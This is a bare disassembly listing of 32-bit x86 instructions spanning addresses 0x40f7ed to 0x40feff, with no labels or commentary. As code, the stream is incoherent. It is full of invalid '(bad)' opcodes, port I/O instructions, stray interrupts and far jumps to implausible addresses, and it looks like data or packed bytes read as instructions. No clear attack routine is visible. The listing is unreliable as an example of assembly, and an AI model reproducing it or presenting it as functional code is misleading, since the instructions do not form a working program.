  40f7ed:	xor    al,0xfb
  40f7ef:	int3   
  40f7f0:	mov    BYTE PTR [ecx-0x44],dh
  40f7f3:	dec    ebp
  40f7f4:	mov    edi,DWORD PTR [eax]
  40f7f6:	push   edi
  40f7f7:	je     0x40f798
  40f7f9:	mul    DWORD PTR [esi-0x50135166]
  40f7ff:	out    dx,al
  40f800:	leave  
  40f801:	or     DWORD PTR [ecx-0x7b540226],ecx
  40f807:	dec    esi
  40f808:	sti    
  40f809:	and    cl,BYTE PTR [esi]
  40f80b:	scas   al,BYTE PTR es:[edi]
  40f80c:	icebp  
  40f80d:	jg     0x40f7df
  40f80f:	test   DWORD PTR ds:0xa33f2293,ebx
  40f815:	inc    esp
  40f816:	outs   dx,BYTE PTR ds:[esi]
  40f817:	cwde   
  40f818:	mov    cl,0xa5
  40f81a:	jl     0x40f84b
  40f81c:	stos   BYTE PTR es:[edi],al
  40f81d:	mov    dl,0x4f
  40f81f:	test   ch,bh
  40f821:	push   es
  40f822:	xchg   DWORD PTR [eax+0x2e],ebx
  40f825:	xchg   ecx,eax
  40f826:	xor    ecx,DWORD PTR [edi-0x7d]
  40f829:	mov    dl,BYTE PTR [esi+0x7]
  40f82c:	xor    ecx,ebx
  40f82e:	and    DWORD PTR [esi],ebx
  40f830:	xor    al,0x3
  40f832:	add    ecx,DWORD PTR [eax]
  40f834:	in     al,dx
  40f835:	in     eax,dx
  40f836:	or     BYTE PTR [eax+0x207e0874],0xf5
  40f83d:	mov    dh,0x5c
  40f83f:	(bad)  
  40f840:	into   
  40f841:	ss pop ebx
  40f843:	xchg   ebp,eax
  40f844:	jae    0x40f86b
  40f846:	add    al,0xe9
  40f848:	push   ebp
  40f849:	add    BYTE PTR [esi+0x24],0x43
  40f84d:	cld    
  40f84e:	jbe    0x40f8ab
  40f850:	ror    bh,1
  40f852:	xor    edi,DWORD PTR [eax+0x442253c8]
  40f858:	ja     0x40f81c
  40f85a:	jns    0x40f8a2
  40f85c:	mov    cl,0xd0
  40f85e:	pushf  
  40f85f:	std    
  40f860:	or     al,0xa6
  40f862:	mov    cl,0x3c
  40f864:	test   eax,0xbbc2c8c3
  40f869:	sub    eax,0x53dfd7e9
  40f86e:	mov    al,0x42
  40f870:	int    0x85
  40f872:	iret   
  40f873:	mov    dh,0x6
  40f875:	fsub   DWORD PTR [ebp+0x1804a4e5]
  40f87b:	test   ch,0x1b
  40f87e:	rcl    ebx,cl
  40f880:	add    BYTE PTR [eax+0x4a65557d],0x4c
  40f887:	mov    edi,0x64946252
  40f88c:	jle    0x40f8f7
  40f88e:	push   esi
  40f88f:	xchg   esp,eax
  40f890:	stos   DWORD PTR es:[edi],eax
  40f891:	aam    0xd6
  40f893:	sub    al,0xa
  40f895:	jp     0x40f871
  40f897:	sub    BYTE PTR [eax+ecx*8],bl
  40f89a:	(bad)  
  40f89b:	frstor [ecx+0x5a102c83]
  40f8a1:	(bad)  
  40f8a2:	call   0x2f0ba214
  40f8a7:	jp     0x40f8ca
  40f8a9:	mov    ah,0x3
  40f8ab:	mov    cl,BYTE PTR [eax+eax*1]
  40f8ae:	aaa    
  40f8af:	pop    ecx
  40f8b0:	outs   dx,DWORD PTR ds:[esi]
  40f8b1:	cld    
  40f8b2:	stos   DWORD PTR es:[edi],eax
  40f8b3:	xor    DWORD PTR [esi],eax
  40f8b5:	push   ecx
  40f8b6:	adc    eax,DWORD PTR ds:0xc0530d36
  40f8bc:	es pushf 
  40f8be:	sbb    BYTE PTR [edi],al
  40f8c0:	xor    al,0x80
  40f8c3:	xor    BYTE PTR ds:0x25d03cc3,dl
  40f8c9:	test   BYTE PTR [eax],bl
  40f8cb:	jle    0x40f944
  40f8cd:	xor    bl,BYTE PTR ds:0xcffa62bb
  40f8d3:	xchg   edi,eax
  40f8d4:	dec    esp
  40f8d5:	aad    0x78
  40f8d7:	rol    BYTE PTR [esi-0x7a208ec7],cl
  40f8dd:	jecxz  0x40f879
  40f8df:	dec    edi
  40f8e0:	push   ecx
  40f8e1:	mov    WORD PTR [ebx+0x1a],es
  40f8e4:	inc    edi
  40f8e5:	xor    al,0x99
  40f8e7:	ret    
  40f8e8:	std    
  40f8e9:	pop    esi
  40f8ea:	xchg   BYTE PTR [edi+0x2bd75da5],ah
  40f8f0:	or     BYTE PTR [ecx],0x3d
  40f8f3:	sub    cl,BYTE PTR [edx+0x2d681f3d]
  40f8f9:	mov    bh,0xf7
  40f8fb:	daa    
  40f8fc:	outs   dx,DWORD PTR ds:[esi]
  40f8fd:	ret    0xf9ac
  40f900:	add    al,0x29
  40f902:	xchg   edx,eax
  40f903:	jo     0x40f8a4
  40f905:	inc    eax
  40f906:	(bad)  
  40f907:	fstp   TBYTE PTR [ecx+0x32]
  40f90a:	pop    ecx
  40f90b:	xchg   edx,eax
  40f90c:	lahf   
  40f90d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f90e:	bnd ret 0xdd0c
  40f912:	adc    ah,BYTE PTR [ebp+eiz*2+0x1a]
  40f916:	shr    DWORD PTR [ebp+0xc],0xa2
  40f91a:	ins    DWORD PTR es:[edi],dx
  40f91b:	xor    DWORD PTR [ecx],eax
  40f91d:	ret    
  40f91e:	xchg   edx,eax
  40f91f:	dec    ecx
  40f920:	mov    ss:0x7a3afafb,eax
  40f926:	repz xor al,0xc0
  40f929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f92a:	sti    
  40f92b:	dec    edi
  40f92c:	aaa    
  40f92d:	xlat   BYTE PTR ds:[ebx]
  40f92e:	mov    cl,bl
  40f930:	mov    BYTE PTR [edi-0x82632d4],al
  40f936:	cmp    al,0x12
  40f938:	aaa    
  40f939:	sub    BYTE PTR [edx-0x237923a0],0x74
  40f940:	adc    al,0x68
  40f942:	adc    ecx,DWORD PTR [eax+eax*2+0x35ca4ebd]
  40f949:	jmp    0x40f927
  40f94b:	add    eax,0x8329db4e
  40f950:	lods   al,BYTE PTR ds:[esi]
  40f951:	lods   eax,DWORD PTR ds:[esi]
  40f952:	out    0xb6,eax
  40f954:	fisttp DWORD PTR [ebx]
  40f956:	pop    ds
  40f957:	iret   
  40f958:	mov    ds:0xc8c1acde,eax
  40f95d:	jp     0x40f94f
  40f95f:	adc    DWORD PTR [edx+ebp*1],edx
  40f962:	add    eax,0xb63e551b
  40f967:	aas    
  40f968:	dec    esi
  40f969:	or     al,0x9c
  40f96b:	fs and al,0x48
  40f96e:	popf   
  40f96f:	push   0x78
  40f971:	jle    0x40f97c
  40f973:	mov    ah,0xf6
  40f975:	(bad)  
  40f976:	rcr    DWORD PTR [eax-0x19],1
  40f979:	xchg   esi,eax
  40f97a:	jl     0x40f903
  40f97c:	popf   
  40f97d:	data16 mov ds:0xff22f8c3,al
  40f983:	out    0x27,al
  40f985:	xor    DWORD PTR [edi],ebx
  40f987:	pop    ebp
  40f988:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f989:	mov    esi,ebx
  40f98b:	mov    al,ds:0x533dafc2
  40f990:	xor    ebp,0x51c8024d
  40f996:	jbe    0x40f9b1
  40f998:	cmp    DWORD PTR [esi],esi
  40f99a:	jecxz  0x40f9c4
  40f99c:	sbb    ebp,DWORD PTR [eax-0x1cd070d8]
  40f9a2:	das    
  40f9a3:	or     ah,BYTE PTR [eax-0x39]
  40f9a6:	jne    0x40fa20
  40f9a8:	mov    ah,0xd0
  40f9aa:	lods   eax,DWORD PTR ds:[esi]
  40f9ab:	adc    ecx,DWORD PTR [edi+0x4b0d8814]
  40f9b1:	fwait
  40f9b2:	jo     0x40f934
  40f9b4:	xor    al,0x9c
  40f9b6:	pop    ebx
  40f9b7:	aad    0x21
  40f9b9:	outs   dx,DWORD PTR ds:[esi]
  40f9ba:	fs aad 0x89
  40f9bd:	clc    
  40f9be:	stos   BYTE PTR es:[edi],al
  40f9bf:	mov    al,BYTE PTR [ebp-0x1ec038fe]
  40f9c5:	sbb    edi,DWORD PTR [ecx-0x1]
  40f9c8:	pop    eax
  40f9c9:	outs   dx,DWORD PTR ds:[esi]
  40f9ca:	jg     0x40fa27
  40f9cc:	sti    
  40f9cd:	and    esp,DWORD PTR [eax-0x651fc29b]
  40f9d3:	mov    ah,0xc3
  40f9d5:	jmp    0x40f969
  40f9d7:	adc    BYTE PTR [eax+0x19],ch
  40f9da:	and    BYTE PTR [ebp-0x3a63c0a9],ah
  40f9e0:	add    ch,BYTE PTR [ecx+0x6a]
  40f9e3:	retf   0x21b9
  40f9e6:	mov    ds:0xb616ee02,eax
  40f9eb:	sti    
  40f9ec:	mov    ds:0xd8af3d99,al
  40f9f1:	loopne 0x40fa6e
  40f9f3:	jae    0x40fa47
  40f9f5:	dec    esp
  40f9f6:	add    esp,DWORD PTR [ecx+0x66]
  40f9f9:	dec    ebp
  40f9fa:	mov    esp,0x4e243ca1
  40f9ff:	sbb    ebp,esi
  40fa01:	fs fstp st(6)
  40fa04:	enter  0x4f18,0xf6
  40fa08:	retf   
  40fa09:	rol    BYTE PTR [ebx+0x19c26da],cl
  40fa0f:	xchg   DWORD PTR [edx],esi
  40fa11:	mov    ecx,0x70bc5eba
  40fa16:	(bad)  
  40fa17:	addr16 inc ebp
  40fa19:	cmp    BYTE PTR [ebp+0x587874cb],0xad
  40fa20:	mov    esp,0xb60c7b3a
  40fa25:	enter  0xaec6,0xd7
  40fa29:	outs   dx,DWORD PTR ds:[esi]
  40fa2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa2b:	je     0x40fa66
  40fa2d:	(bad)  
  40fa2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa2f:	xor    eax,0xe1e684c0
  40fa34:	aad    0x34
  40fa36:	iret   
  40fa37:	jmp    0x608e:0x647c9907
  40fa3e:	fisubr DWORD PTR [edi-0x1e]
  40fa41:	adc    DWORD PTR [ebx+ebp*2],edx
  40fa44:	and    esp,edx
  40fa46:	jmp    0x40fa6a
  40fa48:	inc    esi
  40fa49:	mov    eax,ds:0xe32d81cb
  40fa4e:	rcr    DWORD PTR [esi-0x46],0xfd
  40fa52:	je     0x40fa2a
  40fa54:	ins    DWORD PTR es:[edi],dx
  40fa55:	jg     0x40fa95
  40fa57:	das    
  40fa58:	mov    ch,0x2f
  40fa5a:	xor    eax,0xf97ac498
  40fa5f:	jne    0x40f9e5
  40fa61:	mov    dl,0x6b
  40fa63:	loop   0x40fa62
  40fa65:	and    esi,edx
  40fa67:	adc    ch,BYTE PTR [esi+0x16]
  40fa6a:	and    dh,BYTE PTR [ebx+eiz*2+0x3ef19735]
  40fa71:	sbb    eax,0x2b690278
  40fa76:	mov    cl,0xb3
  40fa78:	ds call 0x1f07:0x237824d3
  40fa80:	push   ebx
  40fa81:	mov    ecx,0xa4f0c9b7
  40fa86:	jmp    0xf465839
  40fa8b:	test   eax,0xdd055e57
  40fa90:	and    BYTE PTR [esi],dl
  40fa92:	xchg   ebp,eax
  40fa93:	outs   dx,DWORD PTR ds:[esi]
  40fa94:	add    DWORD PTR [ebx-0x5894e8a1],ecx
  40fa9a:	dec    edx
  40fa9b:	cld    
  40fa9c:	dec    esi
  40fa9d:	dec    ecx
  40fa9e:	push   cs
  40fa9f:	test   DWORD PTR [ebx+eax*8],eax
  40faa2:	pop    ds
  40faa3:	pop    esp
  40faa4:	leave  
  40faa5:	inc    esi
  40faa6:	cmp    bl,ah
  40faa8:	shl    BYTE PTR ds:0x98c331dd,0x21
  40faaf:	sbb    bh,BYTE PTR [esi-0x71]
  40fab2:	cld    
  40fab3:	mov    edx,0x95e2422c
  40fab8:	adc    eax,0xa28014f6
  40fabd:	xchg   ebp,eax
  40fabe:	imul   edx,DWORD PTR [edi],0x25
  40fac1:	pop    esp
  40fac2:	imul   eax,DWORD PTR [eax],0x4d
  40fac5:	out    0x52,eax
  40fac7:	mov    dh,0xdd
  40fac9:	xchg   ecx,eax
  40faca:	adc    cl,cl
  40facc:	int    0x46
  40face:	out    0x9a,eax
  40fad0:	mov    ss,WORD PTR [ebp+0x1]
  40fad3:	pop    ecx
  40fad4:	clc    
  40fad5:	hlt    
  40fad6:	and    BYTE PTR [ebx-0x20],dh
  40fad9:	jo     0x40faab
  40fadb:	xchg   esp,eax
  40fadc:	punpckhdq mm2,QWORD PTR [edx-0x3f]
  40fae0:	mov    dl,0x79
  40fae2:	ror    bh,0x59
  40fae5:	out    dx,al
  40fae6:	mov    ebx,0x9683edf2
  40faeb:	mov    eax,ds:0x977d9380
  40faf0:	xor    eax,0xd49faca5
  40faf5:	inc    esi
  40faf6:	jecxz  0x40fa8d
  40faf8:	sbb    esi,esi
  40fafa:	push   ecx
  40fafb:	xchg   edx,eax
  40fafc:	or     esi,DWORD PTR [ecx+ebp*4-0x47274766]
  40fb03:	repnz xor BYTE PTR [edx+0x43],bh
  40fb07:	in     eax,0x80
  40fb09:	loopne 0x40fb47
  40fb0b:	scas   al,BYTE PTR es:[edi]
  40fb0c:	mov    bh,al
  40fb0e:	jnp    0x40fadb
  40fb10:	adc    BYTE PTR [edi],cl
  40fb12:	pop    esp
  40fb13:	xchg   edi,eax
  40fb14:	jmp    0xdb2d2cc3
  40fb19:	into   
  40fb1a:	test   eax,0x21bf63b5
  40fb1f:	sahf   
  40fb20:	inc    edi
  40fb21:	jle    0x40fb72
  40fb23:	div    DWORD PTR [ecx+0x615f2687]
  40fb29:	sbb    BYTE PTR [ebx],bh
  40fb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb2c:	jmp    0x40faf7
  40fb2e:	ins    DWORD PTR es:[edi],dx
  40fb2f:	nop
  40fb30:	xor    bl,dh
  40fb32:	ja     0x40fb1e
  40fb34:	gs ds sti 
  40fb37:	xchg   BYTE PTR ds:0x704a4adb,ch
  40fb3d:	mov    dh,0x1a
  40fb3f:	xchg   ebp,eax
  40fb40:	aad    0x8c
  40fb42:	mov    ch,BYTE PTR [eax+0x5e]
  40fb45:	cmp    eax,0x8484c3a7
  40fb4a:	cmp    eax,0xc90a37be
  40fb4f:	retf   0x5582
  40fb52:	out    0xd5,eax
  40fb54:	std    
  40fb55:	jne    0x40faf3
  40fb57:	add    al,0x8d
  40fb59:	test   eax,0x2f76482a
  40fb5e:	test   eax,0x17caff5c
  40fb63:	add    eax,0x2a7a1ce8
  40fb68:	loop   0x40fba9
  40fb6a:	xor    BYTE PTR [eax+0x5b18e356],ch
  40fb70:	add    ebp,DWORD PTR [esi+0x7c2c4482]
  40fb76:	sbb    al,0x26
  40fb78:	push   ecx
  40fb79:	outs   dx,DWORD PTR ds:[esi]
  40fb7a:	in     al,dx
  40fb7b:	icebp  
  40fb7c:	mov    fs,WORD PTR [eax+0x1c]
  40fb7f:	mov    ebp,0x81c51ac7
  40fb84:	imul   esp,DWORD PTR [edi+ebx*1+0x2c0b4d2f],0xffffff91
  40fb8c:	jmp    0x40fb11
  40fb8e:	fcmovb st,st(3)
  40fb90:	movhps QWORD PTR [ebp+0x3c],xmm2
  40fb94:	jmp    0x40fb98
  40fb96:	sub    DWORD PTR [edi-0x14],ebp
  40fb99:	xchg   ebx,eax
  40fb9a:	mov    ebp,0xbf222d4b
  40fb9f:	inc    edi
  40fba0:	bound  ebp,QWORD PTR [edx+0x1c]
  40fba3:	std    
  40fba4:	dec    esi
  40fba5:	mov    ebp,0xfdb2c166
  40fbaa:	or     BYTE PTR [eax],cl
  40fbac:	lea    esp,[ebp-0x2c18cb55]
  40fbb2:	rcl    DWORD PTR [eax+0x41],1
  40fbb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbb6:	imul   ecx,DWORD PTR [edx],0x64
  40fbb9:	lsl    ebp,WORD PTR [eax]
  40fbbc:	shr    DWORD PTR [esi],cl
  40fbbe:	adc    dh,al
  40fbc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fbc1:	pop    ebp
  40fbc2:	add    eax,0x13edd581
  40fbc7:	inc    ebp
  40fbc8:	scas   al,BYTE PTR es:[edi]
  40fbc9:	nop
  40fbca:	dec    esp
  40fbcb:	adc    ch,BYTE PTR [ebx]
  40fbcd:	outs   dx,BYTE PTR ds:[esi]
  40fbce:	ds xor ebx,eax
  40fbd1:	mov    WORD PTR [eax-0x9],gs
  40fbd4:	pop    edi
  40fbd5:	sub    ebp,ebp
  40fbd7:	addr16 push 0xa71b3e34
  40fbdd:	adc    al,BYTE PTR ds:0xfadbee6d
  40fbe3:	sahf   
  40fbe4:	les    ebp,FWORD PTR [esi-0x32]
  40fbe7:	les    ebp,FWORD PTR [ebp+ebp*2+0x7af61ce1]
  40fbee:	icebp  
  40fbef:	into   
  40fbf0:	xchg   edi,eax
  40fbf1:	xor    BYTE PTR [edi+esi*2+0x34],ch
  40fbf5:	lods   eax,DWORD PTR ds:[esi]
  40fbf6:	call   0x36cd6226
  40fbfb:	out    dx,eax
  40fbfc:	xlat   BYTE PTR ds:[ebx]
  40fbfd:	push   es
  40fbfe:	out    dx,eax
  40fbff:	mov    eax,ds:0x956715c3
  40fc04:	ja     0x40fc00
  40fc06:	fadd   st(4),st
  40fc08:	call   0xe0ab12a0
  40fc0d:	mov    bl,0x40
  40fc0f:	mov    ch,0x6
  40fc11:	js     0x40fc7d
  40fc13:	fstp   TBYTE PTR [ebx-0x11]
  40fc16:	ret    
  40fc17:	sar    BYTE PTR [ebp+0x38],1
  40fc1a:	je     0x40fbdc
  40fc1c:	div    al
  40fc1e:	or     BYTE PTR [ebp-0x55],al
  40fc21:	jl     0x40fbbe
  40fc23:	xchg   ebp,eax
  40fc24:	out    dx,eax
  40fc25:	mov    WORD PTR [ebp-0x75eea4ed],ss
  40fc2b:	aam    0xe0
  40fc2d:	xchg   ecx,eax
  40fc2e:	push   ebp
  40fc2f:	stc    
  40fc30:	mov    dl,0x4b
  40fc32:	ror    DWORD PTR [edx],1
  40fc34:	lods   al,BYTE PTR ds:[esi]
  40fc35:	sbb    al,BYTE PTR [eax-0x6957dfe0]
  40fc3b:	es dec ebx
  40fc3d:	pop    edi
  40fc3e:	iret   
  40fc3f:	scas   al,BYTE PTR es:[edi]
  40fc40:	sbb    BYTE PTR [ecx+0x3336941a],ch
  40fc46:	dec    ebx
  40fc47:	inc    edx
  40fc48:	(bad)  
  40fc49:	(bad)  
  40fc4a:	sbb    al,0x95
  40fc4c:	and    ch,bh
  40fc4e:	aam    0x28
  40fc50:	test   BYTE PTR [ebp+0x20327381],0x6b
  40fc57:	or     eax,0xf33f3e07
  40fc5c:	jbe    0x40fc58
  40fc5e:	ret    0xef83
  40fc61:	outs   dx,BYTE PTR ds:[esi]
  40fc62:	stos   DWORD PTR es:[edi],eax
  40fc63:	mov    BYTE PTR [esi+edi*2-0x50d25ad2],al
  40fc6a:	js     0x40fc8c
  40fc6c:	xlat   BYTE PTR ds:[ebx]
  40fc6d:	pop    ecx
  40fc6e:	dec    esi
  40fc6f:	retf   
  40fc70:	push   esi
  40fc71:	jnp    0x40fc89
  40fc73:	mov    bl,0x2f
  40fc75:	or     al,0x7b
  40fc77:	jmp    0x6f8c1445
  40fc7c:	dec    edi
  40fc7d:	ss dec eax
  40fc7f:	and    eax,0x2978d21b
  40fc84:	(bad)  
  40fc85:	and    ebx,DWORD PTR [eax-0x63629369]
  40fc8b:	push   ecx
  40fc8c:	fild   DWORD PTR [edi]
  40fc8e:	push   ecx
  40fc8f:	retf   
  40fc90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc91:	lds    ebp,FWORD PTR [ebp+edx*1+0x14e1beb3]
  40fc98:	cs sub al,0x13
  40fc9b:	cs push cs
  40fc9d:	or     al,0x60
  40fc9f:	adc    BYTE PTR [ecx-0x2f1ab985],0xe4
  40fca6:	sbb    eax,0xcd2a4237
  40fcab:	pop    edi
  40fcac:	cs jnp 0x40fcdc
  40fcaf:	fadd   DWORD PTR [edi-0x75]
  40fcb2:	and    bl,BYTE PTR [esi-0x57]
  40fcb5:	minps  xmm1,xmm6
  40fcb8:	push   es
  40fcb9:	mov    ch,bh
  40fcbb:	pop    eax
  40fcbc:	dec    ebx
  40fcbd:	push   ebp
  40fcbe:	push   ds
  40fcbf:	xchg   edi,eax
  40fcc0:	int    0x48
  40fcc2:	lahf   
  40fcc3:	push   ss
  40fcc4:	ss loop 0x40fd46
  40fcc7:	int3   
  40fcc8:	retf   0x64e6
  40fccb:	inc    edi
  40fccc:	push   ss
  40fccd:	fsubr  QWORD PTR [edx]
  40fccf:	addr16 adc al,0x6b
  40fcd2:	aad    0xa
  40fcd4:	fsubr  st,st(4)
  40fcd6:	cdq    
  40fcd7:	pop    esi
  40fcd8:	test   BYTE PTR [esi+0x3572407d],0x83
  40fcdf:	jno    0x40fd3b
  40fce1:	xor    DWORD PTR [eax],ebx
  40fce3:	jmp    0x7953:0x8092654b
  40fcea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fceb:	mov    cl,0xc9
  40fced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcee:	mov    bh,0x60
  40fcf0:	icebp  
  40fcf1:	pop    ss
  40fcf2:	and    cl,BYTE PTR [ecx]
  40fcf4:	addr16 mov ecx,0x7ed070f0
  40fcfa:	(bad)  
  40fcfb:	inc    DWORD PTR [ebx-0x70]
  40fcfe:	xchg   ecx,eax
  40fcff:	mov    BYTE PTR [esi],bl
  40fd01:	add    bh,BYTE PTR [esp+edi*4+0x14]
  40fd05:	cmp    al,0x48
  40fd07:	lods   al,BYTE PTR ds:[esi]
  40fd08:	sbb    al,0xfb
  40fd0a:	(bad)  
  40fd0b:	cld    
  40fd0c:	into   
  40fd0d:	stos   DWORD PTR es:[edi],eax
  40fd0e:	xor    al,0xe5
  40fd10:	rcr    DWORD PTR [ebx*1-0x62add930],0x24
  40fd18:	and    dl,al
  40fd1a:	xchg   ebx,eax
  40fd1b:	xlat   BYTE PTR ds:[ebx]
  40fd1c:	in     al,dx
  40fd1d:	jnp    0x40fd88
  40fd1f:	jo     0x40fd12
  40fd21:	cmp    esi,ecx
  40fd23:	add    DWORD PTR [edx],0x49e8e2b9
  40fd29:	int    0x24
  40fd2b:	jo     0x40fcce
  40fd2d:	xchg   ecx,eax
  40fd2e:	retf   0x1d2a
  40fd31:	adc    DWORD PTR [edi+0x45],eax
  40fd34:	fiadd  WORD PTR [ebp+0x1f5b78db]
  40fd3a:	jne    0x40fd7a
  40fd3c:	xchg   DWORD PTR [ebp+0x3],eax
  40fd3f:	mov    edi,0xae0990b1
  40fd44:	pop    ss
  40fd45:	pop    eax
  40fd46:	push   ss
  40fd47:	addr16 rcl al,0xac
  40fd4b:	xchg   esi,eax
  40fd4c:	ret    0x9b2c
  40fd4f:	mov    edi,0x791f469d
  40fd54:	inc    esi
  40fd55:	dec    esp
  40fd56:	iret   
  40fd57:	mov    edi,0x6034953b
  40fd5c:	inc    esi
  40fd5d:	(bad)  
  40fd5e:	push   ebx
  40fd5f:	adc    BYTE PTR [edx],al
  40fd61:	mov    BYTE PTR [ebx-0x50],dh
  40fd64:	xor    al,0x9c
  40fd66:	mov    edx,0x61ecda8c
  40fd6b:	nop
  40fd6c:	or     eax,0xec1d90af
  40fd71:	jae    0x40fd66
  40fd73:	lods   al,BYTE PTR ds:[esi]
  40fd74:	outs   dx,DWORD PTR ds:[esi]
  40fd75:	push   es
  40fd76:	loopne 0x40fdd6
  40fd78:	mov    ss,WORD PTR [ebx+0x75]
  40fd7b:	cld    
  40fd7c:	mov    ebx,0xfe170b92
  40fd81:	lahf   
  40fd82:	fimul  WORD PTR [edi-0x4]
  40fd85:	test   al,0x20
  40fd87:	in     eax,0x74
  40fd89:	fiadd  WORD PTR [esi+eax*4+0x79]
  40fd8d:	iret   
  40fd8e:	aad    0x8
  40fd90:	inc    eax
  40fd91:	rcr    BYTE PTR [eax+0x5e11b891],1
  40fd97:	ffreep st(4)
  40fd99:	pop    esp
  40fd9a:	mov    edx,0xec2f130a
  40fd9f:	fisubr DWORD PTR [ebx+0x60adb099]
  40fda5:	push   ebx
  40fda6:	dec    edx
  40fda7:	push   ds
  40fda8:	inc    esp
  40fda9:	cwde   
  40fdaa:	and    al,0x75
  40fdac:	mov    cl,0x32
  40fdae:	dec    edi
  40fdaf:	dec    ebp
  40fdb0:	retf   0xf2e0
  40fdb3:	sub    al,0xd9
  40fdb5:	inc    ebp
  40fdb6:	fwait
  40fdb7:	sub    DWORD PTR [esi-0x5fd7be39],edx
  40fdbd:	rcl    BYTE PTR ds:[eax+ecx*4],1
  40fdc1:	in     eax,dx
  40fdc2:	or     BYTE PTR [eax+0x65],ch
  40fdc5:	add    BYTE PTR [ebp-0x52522edf],bl
  40fdcb:	mov    eax,ds:0xcac36e75
  40fdd0:	add    al,0xbb
  40fdd2:	pop    ebp
  40fdd3:	xchg   esp,eax
  40fdd4:	cmp    eax,0x153394
  40fdd9:	push   esi
  40fdda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fddb:	or     BYTE PTR [edi],ch
  40fddd:	xchg   DWORD PTR [eax-0x304b78ec],ecx
  40fde3:	pop    ds
  40fde4:	cs cli 
  40fde6:	test   ch,bh
  40fde8:	adc    edi,esi
  40fdea:	xchg   edx,eax
  40fdeb:	call   0xd195:0xd6f1dc06
  40fdf2:	inc    ebp
  40fdf3:	das    
  40fdf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdf5:	cwde   
  40fdf6:	cmp    ch,BYTE PTR [eax+0x51]
  40fdf9:	jbe    0x40fe5a
  40fdfb:	test   eax,0xf17f83aa
  40fe00:	pop    ecx
  40fe01:	inc    edi
  40fe02:	ins    DWORD PTR es:[edi],dx
  40fe03:	fs fidiv DWORD PTR cs:[eax+0x3f7fb1eb]
  40fe0b:	pusha  
  40fe0c:	fcomip st,st(0)
  40fe0e:	ds pop ebx
  40fe10:	add    eax,0x3dde327d
  40fe15:	adc    eax,0xa60fd60c
  40fe1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe1b:	mov    eax,0x7158f490
  40fe20:	dec    edi
  40fe21:	mov    ah,0x72
  40fe23:	mov    ebx,ecx
  40fe25:	push   ebx
  40fe26:	push   esi
  40fe27:	fcomp  DWORD PTR [esi-0x38d1919b]
  40fe2d:	xchg   esp,eax
  40fe2e:	shl    BYTE PTR [edx+0x5f],0x1f
  40fe32:	loope  0x40fe25
  40fe34:	jo     0x40fddf
  40fe36:	dec    ebp
  40fe37:	arpl   WORD PTR [esi+0x4c],bx
  40fe3a:	dec    ebp
  40fe3b:	inc    ebp
  40fe3c:	pop    ebx
  40fe3d:	cli    
  40fe3e:	pushf  
  40fe3f:	cmp    al,0x73
  40fe41:	in     al,dx
  40fe42:	sbb    esi,edi
  40fe44:	cmp    al,0x93
  40fe46:	pop    esp
  40fe47:	fst    DWORD PTR [eax+0x22]
  40fe4a:	out    0xf4,eax
  40fe4c:	or     al,BYTE PTR ds:0x55e4b236
  40fe52:	jmp    DWORD PTR [ebp-0xa]
  40fe55:	xchg   eax,esi
  40fe57:	mov    ebx,DWORD PTR [esi+0xd44d5e1]
  40fe5d:	sub    BYTE PTR [edi],bh
  40fe5f:	push   ebx
  40fe60:	fidiv  WORD PTR [eax+0x58]
  40fe63:	lock xlat BYTE PTR ds:[ebx]
  40fe65:	add    eax,0xb4da4bbd
  40fe6a:	adc    DWORD PTR [edi+0x3eea0c],esp
  40fe70:	pop    esp
  40fe71:	ins    DWORD PTR es:[edi],dx
  40fe72:	fild   QWORD PTR [edi-0x46]
  40fe75:	inc    ebp
  40fe76:	add    al,0xcf
  40fe78:	jecxz  0x40feac
  40fe7a:	xlat   BYTE PTR ds:[ebx]
  40fe7b:	js     0x40fea9
  40fe7d:	daa    
  40fe7e:	cmp    ch,BYTE PTR [eax-0x79]
  40fe81:	cmp    BYTE PTR [ecx+0x69],ah
  40fe84:	xchg   edi,eax
  40fe85:	or     dh,BYTE PTR [ecx+0x29]
  40fe88:	adc    BYTE PTR [ecx+eax*1-0x53330d67],dh
  40fe8f:	les    ecx,FWORD PTR [esi+ebp*8-0x22]
  40fe93:	ss jno 0x40ff03
  40fe96:	test   eax,0xf7f3358a
  40fe9b:	scas   eax,DWORD PTR es:[edi]
  40fe9c:	sti    
  40fe9d:	and    DWORD PTR [edx],0x38
  40fea0:	pusha  
  40fea1:	push   esp
  40fea2:	push   ecx
  40fea3:	xlat   BYTE PTR ds:[ebx]
  40fea4:	jmp    0x7da9f904
  40fea9:	jmp    0xe229:0x2be7e0dd
  40feb0:	paddusw mm6,mm7
  40feb3:	fcom   st(7)
  40feb5:	jmp    0xab6b7670
  40feba:	clc    
  40febb:	dec    esp
  40febc:	and    al,0x96
  40febe:	aaa    
  40febf:	cmp    eax,0x9e9f5d1e
  40fec4:	jl     0x40fe6c
  40fec6:	(bad)  
  40fec7:	lea    ebp,[ecx+eiz*4-0x5ab123b0]
  40fece:	pop    esp
  40fecf:	or     dl,0xab
  40fed2:	aas    
  40fed3:	retf   0xc298
  40fed6:	mov    ebx,0x66b199c4
  40fedb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fedc:	pushf  
  40fedd:	les    edi,FWORD PTR [ebp-0x1e]
  40fee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fee1:	xchg   DWORD PTR [ecx+edi*4-0x736117d4],esi
  40fee8:	fmul   DWORD PTR [ebx-0x61c1b1bc]
  40feee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feef:	pop    ebp
  40fef0:	add    BYTE PTR [esp+ebx*2+0x44935a40],cl
  40fef7:	test   eax,0x9f6e1c20
  40fefc:	cdq    
  40fefd:	jnp    0x40fea3
  40feff:	xor    BYTE PTR [edi],bh
